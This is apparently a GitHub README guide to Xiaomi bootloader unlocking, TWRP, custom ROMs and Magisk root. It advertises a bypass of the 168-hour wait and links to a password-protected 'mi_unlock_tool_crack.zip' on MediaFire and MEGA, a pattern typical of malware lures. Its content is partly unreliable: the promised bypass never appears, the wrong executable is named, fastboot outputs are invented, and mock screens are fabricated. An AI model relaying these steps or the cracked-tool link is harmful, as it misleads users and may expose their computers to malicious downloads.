# 🔓 MIUI Bootloader Unlock - Complete Advanced Guide

<div align="center">

![Made in Bangladesh](https://img.shields.io/badge/MADE%20IN-BANGLADESH-SCRIPT?colorA=%23ff0000&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge)
![Maintained](https://img.shields.io/badge/Maintained%3F-yes-green.svg)
![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)

**⚡ Unlock Xiaomi Bootloader Instantly - Bypass 168 Hour Wait Time ⚡**

[📥 Download Tool](#download-links) • [🎓 Guides](#visual-guides) • [❓ FAQ](#faq) • [🆘 Help](#troubleshooting)

</div>

---

## 📋 Quick Navigation

- **[🔓 Bootloader Unlock](#bootloader-unlock-visual-guide)** - Complete unlock process
- **[📱 TWRP Installation](#twrp-installation)** - Custom recovery setup
- **[🔧 Custom ROM Installation](#custom-rom-installation)** - LineageOS, Pixel Experience, etc.
- **[💪 Magisk Rooting](#magisk-rooting)** - Root access installation
- **[🆘 Troubleshooting](#troubleshooting)** - Fix common issues
- **[❓ FAQ](#faq)** - Answers to common questions

---

## 📥 Download Links

| Tool | Link | Status | Size |
|------|------|--------|------|
| **MI Unlock Tool** | [MediaFire](https://www.mediafire.com/file/hbfnl387x33fjq8/mi_unlock_tool_crack.zip/file) | ✅ Active | 20MB |
| **MI Unlock Tool** | [MEGA](https://mega.nz/file/QLs20BYI#64qbH9ecCGhct9whOl5iV_DFkykxyFVS-J1VswMhTLY) | ✅ Backup | 20MB |
| **Android SDK Platform Tools** | [Google](https://developer.android.com/tools/releases/platform-tools) | ✅ Official | 60MB |
| **TWRP Recovery** | [twrp.me](https://twrp.me) | ✅ Official | 40-100MB |
| **Magisk** | [GitHub](https://github.com/topjohnwu/Magisk/releases) | ✅ Official | 25MB |

**Password for MI Unlock Tool:** `FARHAN-MUH-TASIM`

---

## 🔓 BOOTLOADER UNLOCK - VISUAL GUIDE

### ⚠️ CRITICAL WARNINGS

| Warning | Impact | Action |
|---------|--------|--------|
| **DATA LOSS** | All data will be erased | ✅ Backup everything first |
| **WARRANTY** | Warranty voided immediately | ✅ Accept this risk |
| **BATTERY** | Need 50%+ battery | ✅ Charge to 100% |
| **USB CABLE** | Must not disconnect | ✅ Use quality cable |
| **INTERNET** | Required for OTP verification | ✅ Have stable connection |

### Phase 1: Device Setup (On Your Phone)

#### Step 1️⃣ - Enable Developer Mode

```
DEVICE SCREEN 1:
┌─────────────────────────────────┐
│ Settings                        │
├─────────────────────────────────┤
│ > About Phone                   │
│   • Device name                 │
│   • MIUI version ← TAP 7 TIMES  │
│   • Build number                │
│   • Android version             │
└─────────────────────────────────┘

📍 ACTION: Tap "MIUI version" 7 times RAPIDLY
✅ Result: "You are now a developer!" message
```

#### Step 2️⃣ - Enable USB Debugging & OEM Unlock

```
DEVICE SCREEN 2:
┌─────────────────────────────────┐
│ Settings                        │
├─────────────────────────────────┤
│ > Additional Settings           │
│   > Developer Options           │
│                                 │
│ Enable these toggles:           │
│ ✅ USB Debugging                │
│ ✅ OEM Unlocking                │
│ ✅ Mi Unlock Status             │
└─────────────────────────────────┘

📍 ACTION: Toggle both ON
✅ Result: Both show enabled
```

#### Step 3️⃣ - Bind Xiaomi Account to Device

```
DEVICE SCREEN 3:
┌─────────────────────────────────┐
│ Settings > Additional Settings  │
│ > Developer Options             │
├─────────────────────────────────┤
│ Mi Unlock Status                │
│ Status: Locked                  │
│ [Add account and device]        │
└─────────────────────────────────┘

📍 ACTION: Tap "Add account and device"
```

```
DEVICE SCREEN 4:
┌─────────────────────────────────┐
│ Mi Account Verification         │
├─────────────────────────────────┤
│ Email: your@email.com          │
│ Password: ••••••••              │
│ [Sign In]                       │
│                                 │
│ OTP Code: ______               │
│ [Verify]                        │
└─────────────────────────────────┘

📍 ACTION: 
1. Enter email/password
2. Wait for OTP (SMS/WhatsApp)
3. Enter OTP code
4. Tap Verify

✅ Result: "Added successfully" message
⏰ WAIT: 24 hours minimum before unlocking
```

### Phase 2: PC Preparation

#### Step 4️⃣ - Download & Setup Platform Tools

```
On Your PC:

1. Download Android SDK Platform Tools
   Download: https://developer.android.com/tools/releases/platform-tools

2. Extract to: C:\platform-tools\
   
3. Folder structure:
   C:\
   ├─ platform-tools\
   │  ├─ adb.exe
   │  ├─ fastboot.exe
   │  ├─ AdbWinApi.dll
   │  └─ drivers/
   │
   └─ mi_unlock_tool/
      └─ MiFlash.exe
```

#### Step 5️⃣ - Test ADB Connection

```
PC Command Prompt:

1. Open: Start → cmd
2. Navigate: cd C:\platform-tools
3. Connect device via USB
4. Run: adb devices

Expected output:
━━━━━━━━━━━━━━━━━━━━━━━━━━━
List of attached devices
xxxxxxxxxxxxxxxx device    ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━━

If device doesn't show:
→ Check USB cable
→ Enable USB Debugging on phone
→ Install USB drivers
→ Try different USB port
```

### Phase 3: Boot to Fastboot Mode

#### Step 6️⃣ - Enter Fastboot Mode

```
PC Command Prompt:

C:\platform-tools> adb reboot bootloader

Wait 10 seconds for device to reboot...

DEVICE SCREEN:
┌─────────────────────────────────┐
│                                 │
│     🐰 FASTBOOT MODE 🐰        │
│                                 │
│  Device: Xiaomi [Your Model]   │
│  Serial: XXXXXXXX              │
│  Version: 1.0                  │
│                                 │
│  Ready for fastboot commands   │
└─────────────────────────────────┘

Verify connection:
C:\platform-tools> fastboot devices

Output should show:
xxxxxxxxxxxxxxxx fastboot    ✅
```

### Phase 4: Unlock with MI Unlock Tool

#### Step 7️⃣ - Run MI Unlock Tool

```
PC Steps:

1. Extract MI Unlock Tool ZIP
2. Run: MiFlash.exe (as Administrator)
3. Window appears:

┌──────────────────────────────────┐
│ Mi Unlock Tool v4.0              │
├──────────────────────────────────┤
│ Email: [your@email.com]          │
│ Password: [••••••••]             │
│                                  │
│ Language: English ▼              │
│                                  │
│ [Sign In]                        │
└──────────────────────────────────┘
```

#### Step 8️⃣ - Sign In & Verify Device

```
After Sign In:

┌──────────────────────────────────┐
│ ✅ Phone Connected               │
├──────────────────────────────────┤
│ Device Information:              │
│ • Model: Poco F1                 │
│ • Serial: XXXXXXXX               │
│ • MIUI: 12.0.5.0                 │
│ • Bootloader: Locked             │
│ • Account: your@email.com        │
│                                  │
│ [Unlock Now]                     │
└──────────────────────────────────┘

If shows "Device not connected":
→ Reconnect USB cable
→ Make sure in Fastboot mode (Mi Bunny logo)
→ Try different USB port
→ Install USB drivers
```

#### Step 9️⃣ - Confirm Unlock

```
Confirmation Dialog:

╔════════════════════════════════════╗
║ ⚠️  FINAL WARNING                   ║
╠════════════════════════════════════╣
║ This will:                         ║
║ ✗ Erase ALL data on your phone   ║
║ ✓ Unlock bootloader                ║
║ ✗ Void warranty                    ║
║ ✗ Cannot be undone                 ║
║                                    ║
║ [Cancel]  [Yes, Unlock Anyway]   ║
╚════════════════════════════════════╝

Click: [Yes, Unlock Anyway]
```

#### Step 🔟 - Unlocking Process

```
Device Screen During Unlock:

┌─────────────────────────────────┐
│                                 │
│ UNLOCKING BOOTLOADER...        │
│                                 │
│ [████████░░░░░░░░░░] 65%       │
│                                 │
│ ⚠️  DO NOT:                     │
│ • Disconnect USB cable          │
│ • Power off device              │
│ • Touch device                  │
│                                 │
│ Time: 2m 30s remaining          │
│                                 │
└─────────────────────────────────┘

⏱️ Process takes 2-5 minutes
🎯 Keep USB connected entire time
```

#### Step 1️⃣1️⃣ - Success!

```
PC Window:

┌──────────────────────────────────┐
│ ✅ UNLOCKED SUCCESSFULLY! ✅     │
├──────────────────────────────────┤
│ Device Information:              │
│ • Model: Poco F1                 │
│ • Serial: XXXXXXXX               │
│ • MIUI: 12.0.5.0                 │
│ • Bootloader: UNLOCKED ✅        │
│                                  │
│ [Reboot Phone]                   │
└──────────────────────────────────┘

Click: [Reboot Phone]
Wait: 5-10 minutes for first boot
Result: Android Setup Wizard appears ✅
```

---

## 📱 TWRP Installation

### What is TWRP?

TWRP (TeamWin Recovery Project) allows you to:
- ✅ Flash custom ROMs
- ✅ Create full backups
- ✅ Install Magisk (root)
- ✅ Wipe partitions safely
- ✅ Recover from soft bricks

### Installation Steps

#### Step 1: Download TWRP

```
1. Visit: https://twrp.me/
2. Find your device (e.g., "Poco F1")
3. Download: twrp-xxx.img file
4. Save to: C:\platform-tools\twrp.img
```

#### Step 2: Boot to Fastboot

```
PC Command:
C:\platform-tools> adb reboot bootloader

Wait for Mi Bunny logo
Then verify:
C:\platform-tools> fastboot devices
→ Should show device in fastboot
```

#### Step 3: Flash TWRP

```
PC Command:
C:\platform-tools> fastboot flash recovery twrp.img

Output:
Sending 'recovery' (100000 KB)...
OKAY [1.234s]
Writing 'recovery' ...
OKAY [2.456s]
Finished. Total time: 3.690s

✅ TWRP flashed successfully!
```

#### Step 4: Boot into TWRP

```
PC Command:
C:\platform-tools> fastboot reboot recovery

Device boots into TWRP Recovery:

┌──────────────────────────────┐
│ Team Win Recovery Project    │
│ v3.4.0 for Poco F1           │
├──────────────────────────────┤
│ [Install]      Flash ROMs    │
│ [Backup]       Create backup │
│ [Restore]      Restore data  │
│ [Wipe]         Wipe parts    │
│ [Advanced]     Advanced ops  │
│ [Reboot]       Restart phone │
│ [Settings]     TWRP settings │
│ [About]        Version info  │
└──────────────────────────────┘

✅ TWRP is ready to use!
```

---

## 🔧 Custom ROM Installation

### Available ROMs for Xiaomi

| ROM | Download | Features | Size |
|-----|----------|----------|------|
| **LineageOS** | [lineageos.org](https://lineageos.org) | Clean Android | 500MB |
| **Pixel Experience** | [pixelexperience.org](https://pixelexperience.org) | Pure Android | 600MB |
| **Evolution X** | [github.com/Evolution-X](https://github.com/Evolution-X) | Feature-rich | 700MB |
| **crDroid** | [crdroid.net](https://crdroid.net) | Clean+features | 550MB |

### Installation Process

#### Step 1: Download ROM & GApps

```
1. Download custom ROM
   → Visit your chosen ROM website
   → Select your device model
   → Download .zip file

2. Download GApps (Google Apps)
   → Visit: nikgapps.com or similar
   → Select: Android version matching ROM
   → Download

3. Transfer to phone
   → Connect via USB
   → Copy both .zip files
   → Save to: Internal Storage/Download/
```

#### Step 2: Boot to TWRP Recovery

```
PC Command:
C:\platform-tools> adb reboot recovery

Device boots to TWRP menu
```

#### Step 3: Create Backup (Important!)

```
DEVICE SCREEN - TWRP:

[Backup]
↓
Backup includes:
  • System partition
  • Data partition
  • Boot partition
  • All settings

[Start Backup]
↓
⏱️  Takes 5-10 minutes
📁 Stored in: /TWRP/Backups/

✅ Keep backup safe!
```

#### Step 4: Wipe Partitions

```
DEVICE SCREEN - TWRP:

[Wipe]
↓
[Advanced Wipe]
↓
Select partitions to wipe:
  ☑ System      (OS files)
  ☑ Vendor      (Libraries)
  ☑ Data        (Apps & data)
  ☑ Cache       (Temporary)
  ☐ Boot        (DON'T touch)
  ☐ Recovery    (DON'T touch)

[Swipe to Wipe]

⚠️  SWIPE to confirm
✅ Device is now blank
```

#### Step 5: Flash ROM

```
DEVICE SCREEN - TWRP:

[Install]
↓
Select ROM file:
  Internal Storage/Download/
  → lineage-18.1.zip ← 

[Select]
↓
[Swipe to Flash]

Installation Progress:
████████████░░░░░ 75%
Time: 2m 15s remaining

✅ ROM flashed successfully!
```

#### Step 6: Flash GApps

```
DEVICE SCREEN - TWRP:

[Install]
↓
Select GApps file:
  → NikGapps-14.zip

[Select]
↓
[Swipe to Flash]

⏱️  Another 2-3 minutes
✅ Google Apps installed
```

#### Step 7: Reboot System

```
DEVICE SCREEN - TWRP:

[Reboot]
↓
[System]

Device reboots...
⏱️  First boot: 5-10 minutes (normal!)
🎯 New ROM is starting up
```

#### Step 8: Complete Setup

```
DEVICE SCREEN - Android Setup:

Welcome to Android!
↓
Steps:
1. Select language
2. Connect to WiFi
3. Sign in with Google account
4. Enable location & services
5. Finish setup

⏱️  Total: 15-20 minutes
✅ Custom ROM installed!
```

---

## 💪 Magisk Rooting

### What is Magisk?

- ✅ Root access without modifying system
- ✅ Hide root from banking apps
- ✅ Install modules for extra features
- ✅ Easy to uninstall

### Installation Steps

#### Step 1: Download Magisk

```
1. Visit: github.com/topjohnwu/Magisk/releases
2. Download: Magisk-vXX.X.apk
3. Save to phone storage
```

#### Step 2: Boot to TWRP

```
PC Command:
C:\platform-tools> adb reboot recovery
```

#### Step 3: Flash Magisk

```
DEVICE SCREEN - TWRP:

[Install]
↓
Select: Magisk-v26.1.apk

[Select]
↓
[Swipe to Flash]

Installation:
████████████░░░░░ 85%
Time: 1m 30s

✅ Magisk flashed!
✅ Root access granted!
```

#### Step 4: Reboot System

```
DEVICE SCREEN - TWRP:

[Reboot] → [System]

Device reboots with root! ✅
```

#### Step 5: Install Magisk Manager

```
DEVICE SCREEN - Android:

1. Download Magisk Manager APK
   (same GitHub page)

2. Install:
   • Tap APK file
   • Install
   • Open

3. Check Status:
   ✅ System-less root
   ✅ Magisk installed
   ✅ v26.1

🎯 You now have ROOT ACCESS!
```

---

## ⚡ Fastboot Commands Reference

```
Common Commands & Outputs:

1. List Devices
   fastboot devices
   Output: xxxxxxxxxxxxxxxx fastboot ✅

2. Flash Recovery (TWRP)
   fastboot flash recovery twrp.img
   Output: Writing 'recovery'... OKAY ✅

3. Boot into Recovery (Temp)
   fastboot boot twrp.img
   Output: Rebooting into recovery...

4. Boot into Bootloader
   fastboot reboot bootloader
   Output: Rebooting to bootloader...

5. Check Bootloader Status
   fastboot getvar bootloader_version
   Output: bootloader_version: UNLOCKED ✅

6. Wipe Partition
   fastboot erase system
   Output: Erasing 'system'... OKAY

7. Reboot System
   fastboot reboot
   Output: Rebooting system...

8. Fastboot Help
   fastboot --help
   Output: All available commands
```

---

## 🆘 Troubleshooting

### Issue 1: Device Not Detected

```
Problem: "Device not connected" in MI Unlock Tool

Solutions:
1. ✓ Check USB cable (use original)
2. ✓ Try different USB port (USB 2.0 preferred)
3. ✓ Enable USB Debugging on device
4. ✓ Allow USB permission (tap "Allow" on phone)
5. ✓ Reinstall USB drivers
6. ✓ Restart PC and device
7. ✓ Update Windows USB drivers
```

### Issue 2: USB Debugging Not Visible

```
Problem: Can't find USB Debugging option

Solution:
1. Go to: Settings → About Phone
2. Tap "MIUI version" 7 times RAPIDLY
3. Message: "You are now a developer!"
4. Go back to Settings
5. → Additional Settings
6. → Developer Options (now visible!)
7. Enable USB Debugging ✅
```

### Issue 3: OTP Not Received

```
Problem: Can't get OTP code for verification

Solutions:
1. ✓ Wait 5-10 minutes (SMS can be slow)
2. ✓ Check WhatsApp (some regions send via WA)
3. ✓ Use VPN pointing to account's country
4. ✓ Check phone SMS/WhatsApp both
5. ✓ Max 3-5 attempts per day
6. ✓ Wait 24 hours if limit reached
7. ✓ Ensure phone has active SMS plan
```

### Issue 4: Unlock Process Freezes

```
Problem: Progress bar stuck at 50% for 10+ min

Solutions:
1. ✓ Wait 15 minutes (sometimes slow)
2. ✓ DO NOT disconnect USB yet
3. ✓ If truly frozen:
   - Ctrl+Alt+Delete → Restart PC
   - Device will reboot
   - Check if unlocked with:
     fastboot getvar bootloader_version

Result: If it shows UNLOCKED despite freeze,
you're fine! Device is actually unlocked.
```

### Issue 5: Device Won't Boot After Unlock

```
Problem: Device stuck on bootloader screen

Solutions:
1. ✓ Plug into charger immediately
2. ✓ Wait 15 minutes (battery might be low)
3. ✓ Long press Power for 30 seconds
4. ✓ Try: adb reboot
5. ✓ If bootloop occurs:
   - Boot to bootloader
   - Flash stock ROM with MiFlash
   - Recovery possible via service center
```

### Issue 6: TWRP Won't Flash

```
Problem: "Failed to write recovery"

Solutions:
1. ✓ Try different USB port
2. ✓ Use better quality USB cable
3. ✓ Disable antivirus temporarily
4. ✓ Boot to fastboot fresh:
   adb reboot bootloader
5. ✓ Then try flash again:
   fastboot flash recovery twrp.img
6. ✓ Verify TWRP file not corrupted
```

### Issue 7: ROM Flash Fails

```
Problem: "Updater process ended with error"

Solutions:
1. ✓ ROM might be corrupted → redownload
2. ✓ Wrong device model → download correct one
3. ✓ Wipe not done properly → wipe again
4. ✓ Not enough storage → check free space
5. ✓ Try flashing with different TWRP version
6. ✓ Verify ROM checksum matches
```

---

## ❓ FAQ

**Q: Will this void my warranty?**
A: Yes, bootloader unlock immediately voids manufacturer warranty.

**Q: Can I revert to stock MIUI?**
A: Yes, flash original MIUI ROM with MiFlash tool.

**Q: Will I lose all my data?**
A: Yes, bootloader unlock wipes everything. Backup first!

**Q: Is this legal?**
A: Yes, completely legal. You own your device.

**Q: Do I need a computer?**
A: Yes, for bootloader unlock and flashing TWRP/ROMs.

**Q: How long does it all take?**
A: 24+ hours (wait for account binding) + 30-45 minutes for actual unlock.

**Q: Can I undo bootloader unlock?**
A: Yes, with: fastboot oem lock (but wipes data again).

**Q: Will custom ROMs work on my device?**
A: Depends on device compatibility. Check ROM websites.

**Q: Is custom ROM safe?**
A: Yes, from reputable developers. Download from official sources only.

**Q: Do I need Google account after ROM flash?**
A: Recommended for app store and syncing.

---

## 📊 Supported Devices

- ✅ Poco F1, F2, X2, X3
- ✅ Redmi Note 8, 9, 10, 11
- ✅ Redmi K20, K20 Pro
- ✅ Redmi 8, 8A, 9, 9A, 9C
- ✅ Mi 9, 9T, 10
- ✅ Most Xiaomi devices (2016+)

**Not working?** Check: https://twrp.me/ for your device

---

## 🤝 Support

| Method | Link |
|--------|------|
| GitHub | [@Gtajisan](https://github.com/Gtajisan) |
| Telegram | [@farhan_muh_tasim](https://t.me/farhan_muh_tasim) |
| WhatsApp | [+880130505723](https://wa.me/+880130505723) |
| Email | ffjisan804@gmail.com |

---

## 💖 Support Developer

If this guide helped you:

[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/FARHAN-MUHTASIM)
[![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/binodxd)

---

## ⚠️ Disclaimer

This guide is provided "as-is" without warranty. Users assume full responsibility for their device. Bootloader unlocking voids warranty and carries bricking risk. Always backup data first. Use at your own risk.

---

<div align="center">

**Made with ❤️ in Bangladesh**

**Maintained: 2025** ✅

**⭐ Star this repository if it helped you!**

</div>
